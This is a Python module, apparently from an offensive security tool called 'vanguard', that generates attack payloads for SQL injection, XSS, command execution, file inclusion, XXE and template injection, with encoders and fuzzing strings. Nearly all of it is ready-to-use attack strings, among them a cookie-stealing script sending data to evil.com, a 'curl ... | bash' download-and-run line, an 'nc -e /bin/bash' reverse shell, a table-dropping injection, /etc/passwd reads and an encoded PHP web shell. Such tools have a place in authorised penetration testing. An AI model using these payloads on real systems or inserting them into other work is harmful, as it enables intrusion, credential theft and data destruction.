#!/usr/bin/env python3
"""
Payload generator module for creating various attack payloads.
"""

import logging
import random
import string
import base64
import urllib.parse
import json
from typing import List, Dict, Any

logger = logging.getLogger("vanguard.payload_generator")

class PayloadGenerator:
    """Advanced payload generator for various vulnerability types."""
    
    def __init__(self):
        """Initialize the payload generator."""
        self.payloads = {
            'sqli': self._load_sqli_payloads(),
            'xss': self._load_xss_payloads(),
            'rce': self._load_rce_payloads(),
            'lfi': self._load_lfi_payloads(),
            'xxe': self._load_xxe_payloads(),
            'ssti': self._load_ssti_payloads()
        }
        
    def generate_payloads(self, vuln_type: str, count: int = 10, 
                         context: str = 'web', encoding: str = None) -> List[str]:
        """
        Generate payloads for a specific vulnerability type.
        
        Args:
            vuln_type: Type of vulnerability (sqli, xss, rce, lfi, xxe, ssti)
            count: Number of payloads to generate
            context: Context for payload (web, json, xml, etc.)
            encoding: Encoding to apply (url, base64, html, etc.)
            
        Returns:
            List of generated payloads
        """
        if vuln_type.lower() not in self.payloads:
            logger.error(f"Unknown vulnerability type: {vuln_type}")
            return []
            
        base_payloads = self.payloads[vuln_type.lower()]
        selected_payloads = random.sample(base_payloads, min(count, len(base_payloads)))
        
        # Apply context modifications
        if context == 'json':
            selected_payloads = [self._jsonify_payload(p) for p in selected_payloads]
        elif context == 'xml':
            selected_payloads = [self._xmlify_payload(p) for p in selected_payloads]
            
        # Apply encoding
        if encoding:
            selected_payloads = [self._encode_payload(p, encoding) for p in selected_payloads]
            
        return selected_payloads
    
    def generate_custom_payload(self, template: str, **kwargs) -> str:
        """
        Generate custom payload from template.
        
        Args:
            template: Payload template with placeholders
            **kwargs: Values to replace in template
            
        Returns:
            Generated payload
        """
        try:
            return template.format(**kwargs)
        except KeyError as e:
            logger.error(f"Missing template parameter: {e}")
            return template
    
    def _load_sqli_payloads(self) -> List[str]:
        """Load SQL injection payloads."""
        return [
            "' OR '1'='1",
            "' OR '1'='1' --",
            "' OR '1'='1' #",
            "' OR 1=1 --",
            "' UNION SELECT NULL--",
            "' UNION SELECT 1,2,3--",
            "' UNION SELECT username,password FROM users--",
            "'; DROP TABLE users; --",
            "' AND (SELECT COUNT(*) FROM users) > 0 --",
            "' OR (SELECT SUBSTRING(@@version,1,1))='5' --",
            "' WAITFOR DELAY '00:00:05' --",
            "' OR SLEEP(5) --",
            "' OR pg_sleep(5) --",
            "1' AND UPDATEXML(1,CONCAT(0x7e,(SELECT version()),0x7e),1) AND '1'='1",
            "1' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT database()),0x7e)) AND '1'='1"
        ]
    
    def _load_xss_payloads(self) -> List[str]:
        """Load XSS payloads."""
        return [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg onload=alert('XSS')>",
            "<iframe src=javascript:alert('XSS')>",
            "javascript:alert('XSS')",
            "<body onload=alert('XSS')>",
            "<input onfocus=alert('XSS') autofocus>",
            "<marquee onstart=alert('XSS')>",
            "<video><source onerror=alert('XSS')>",
            "<audio src=x onerror=alert('XSS')>",
            "'-alert('XSS')-'",
            "\";alert('XSS');//",
            "</script><script>alert('XSS')</script>",
            "<script>document.location='http://evil.com/steal.php?c='+document.cookie</script>",
            "<img src=\"javascript:alert('XSS')\">"
        ]
    
    def _load_rce_payloads(self) -> List[str]:
        """Load RCE payloads."""
        return [
            "ls",
            "cat /etc/passwd",
            "whoami",
            "id",
            "uname -a",
            "ps aux",
            "netstat -an",
            "ifconfig",
            "; ls",
            "| ls",
            "&& ls",
            "`ls`",
            "$(ls)",
            "${IFS}ls",
            "wget http://evil.com/shell.sh",
            "curl http://evil.com/shell.sh | bash",
            "nc -e /bin/bash evil.com 4444",
            "python -c 'import os; os.system(\"ls\")'",
            "perl -e 'system(\"ls\")'"
        ]
    
    def _load_lfi_payloads(self) -> List[str]:
        """Load LFI payloads."""
        return [
            "../etc/passwd",
            "../../etc/passwd",
            "../../../etc/passwd",
            "../../../../etc/passwd",
            "../../../../../etc/passwd",
            "..\\..\\..\\windows\\win.ini",
            "..\\..\\..\\..\\windows\\win.ini",
            "/etc/passwd",
            "/proc/self/environ",
            "/proc/version",
            "/proc/cmdline",
            "php://filter/read=convert.base64-encode/resource=index.php",
            "php://input",
            "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8%2B",
            "expect://ls",
            "file:///etc/passwd"
        ]
    
    def _load_xxe_payloads(self) -> List[str]:
        """Load XXE payloads."""
        return [
            """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<foo>&xxe;</foo>""",
            """<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://evil.com/evil.dtd">]>
<foo>&xxe;</foo>""",
            """<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "file:///etc/passwd">%xxe;]>""",
            """<!DOCTYPE foo SYSTEM "http://evil.com/evil.dtd">""",
            """<?xml version="1.0"?>
<!DOCTYPE foo [
<!ELEMENT foo ANY>
<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">
]>
<foo>&xxe;</foo>"""
        ]
    
    def _load_ssti_payloads(self) -> List[str]:
        """Load SSTI payloads."""
        return [
            "{{7*7}}",
            "{{7*'7'}}",
            "{{config}}",
            "{{request}}",
            "{{''.__class__.__mro__[2].__subclasses__()}}",
            "{{config.__class__.__init__.__globals__['os'].popen('ls').read()}}",
            "${7*7}",
            "#{7*7}",
            "*{7*7}",
            "${{<%[%'\"}}%\\",
            "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}",
            "{% for x in ().__class__.__base__.__subclasses__() %}{% if \"warning\" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen('ls').read()}}{% endif %}{% endfor %}"
        ]
    
    def _jsonify_payload(self, payload: str) -> str:
        """Adapt payload for JSON context."""
        return json.dumps(payload)
    
    def _xmlify_payload(self, payload: str) -> str:
        """Adapt payload for XML context."""
        return payload.replace('&', '&amp;').replace('<', '&lt;').replace('>', '&gt;')
    
    def _encode_payload(self, payload: str, encoding: str) -> str:
        """Apply encoding to payload."""
        if encoding.lower() == 'url':
            return urllib.parse.quote(payload)
        elif encoding.lower() == 'base64':
            return base64.b64encode(payload.encode()).decode()
        elif encoding.lower() == 'html':
            return payload.replace('&', '&amp;').replace('<', '&lt;').replace('>', '&gt;').replace('"', '&quot;').replace("'", '&#x27;')
        elif encoding.lower() == 'hex':
            return ''.join(f'\\x{ord(c):02x}' for c in payload)
        else:
            logger.warning(f"Unknown encoding: {encoding}")
            return payload
    
    def generate_fuzzing_strings(self, count: int = 50) -> List[str]:
        """Generate fuzzing strings for input validation testing."""
        fuzzing_strings = [
            # Buffer overflow attempts
            'A' * 100,
            'A' * 255,
            'A' * 1000,
            'A' * 5000,
            
            # Special characters
            "!@#$%^&*()_+",
            "~`-=[]\\{}|;':\",./<>?",
            
            # Unicode and encoding
            "\u0000",
            "\uFFFF",
            "\x00\x01\x02\x03",
            
            # Format strings
            "%s%s%s%s%s",
            "%x%x%x%x%x",
            "%n%n%n%n%n",
            
            # SQL metacharacters
            "'\"();--",
            
            # Command injection
            ";|&`$()",
            
            # Directory traversal
            "../../../",
            "..\\..\\..\\",
            
            # Null bytes
            "\x00",
            "%00",
            
            # Script injection
            "<script>",
            "javascript:",
            "vbscript:"
        ]
        
        # Add random strings
        for _ in range(count - len(fuzzing_strings)):
            length = random.randint(1, 100)
            chars = string.ascii_letters + string.digits + string.punctuation
            random_string = ''.join(random.choice(chars) for _ in range(length))
            fuzzing_strings.append(random_string)
            
        return fuzzing_strings[:count]